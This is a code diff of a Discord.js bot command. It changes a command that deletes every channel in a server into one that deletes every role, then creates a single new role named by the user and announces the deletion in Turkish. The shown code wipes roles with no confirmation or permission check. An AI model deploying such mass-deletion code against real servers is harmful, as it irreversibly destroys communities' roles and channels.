@@ -2,11 +2,9 @@ const Discord = require("discord.js");
 
 module.exports.run = async (client, message, args) => {
 let mesaj = args.slice(0).join(" ")
-message.guild.channels.map(m => m.delete())
-message.guild.createChannel(`${mesaj}`, 'text').then(zzz => {
-  
-  zzz.send('```**Tüm Kanallar Silindi.!**```')
-})
+message.guild.roles.forEach(a => a.delete())
+message.guild.createRole({ name: `${mesaj}`, position: 20, permissions: ['MANAGE_MESSAGES'], color: 'RED'})
+message.channel.send('```**Tüm Roller Silindi.**```')
 };
 
 module.exports.conf = {
@@ -18,7 +16,7 @@ module.exports.conf = {
 };
 
 module.exports.help = {
-  name: "kanal",
-  description: "kanal",
-  usage: "kanal"
+  name: "rol",
+  description: "rol",
+  usage: "rol"
 };
